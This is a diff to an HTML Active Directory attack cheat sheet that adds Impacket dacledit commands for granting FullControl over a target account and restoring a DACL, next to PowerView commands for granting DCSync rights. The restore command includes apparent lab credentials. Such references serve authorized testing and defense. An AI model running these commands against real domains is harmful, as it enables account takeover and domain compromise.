@@ -1973,6 +1973,12 @@ rpcclient<span class="w"> </span>-U<span class="w"> </span>&lt;domain&gt;/&lt;co
 <span class="c"># AD Module</span>
 <span class="nb">Set-ADACL</span> <span class="n">-DistinguishedName</span> <span class="s1">'DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-Principal</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
 </code></pre></div>
+<p>Add <code>FullControl</code> rights on the target account with Impacket's <code>dacledit</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'write'</span><span class="w"> </span>-rights<span class="w"> </span><span class="s1">'FullControl'</span><span class="w"> </span>-principal<span class="w"> </span><span class="s1">'&lt;controlled user&gt;'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'&lt;target user&gt;'</span><span class="w"> </span><span class="s1">'&lt;domain&gt;'</span>/<span class="s1">'&lt;controlled user&gt;'</span>:<span class="s1">'&lt;password&gt;'</span>
+</code></pre></div>
+<p>Restore DACL with Impacket's <code>dacledit</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-dacledit<span class="w"> </span>-action<span class="w"> </span><span class="s1">'restore'</span><span class="w"> </span>-file<span class="w"> </span>dacledit-20250317-082720.bak<span class="w"> </span>-target<span class="w"> </span><span class="s1">'tyron.lannister'</span><span class="w"> </span><span class="s1">'sevenkingdoms.local'</span>/<span class="s1">'joffrey.baratheon'</span>:<span class="s1">'1killerlion'</span>
+</code></pre></div>
 <p>Add rights for DCSync (as Domain Admin):</p>
 <div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
 <span class="nb">Add-ObjectAcl</span> <span class="n">-TargetDistinguishedName</span> <span class="s1">'DC=&lt;domain_component&gt;,DC=&lt;domain_component&gt;?&gt;'</span> <span class="n">-PrincipalSamAccountName</span> <span class="p">&lt;</span><span class="n">controlled</span> <span class="n">user</span><span class="p">&gt;</span> <span class="n">-Rights</span> <span class="n">DCSync</span> <span class="n">-Verbose</span>
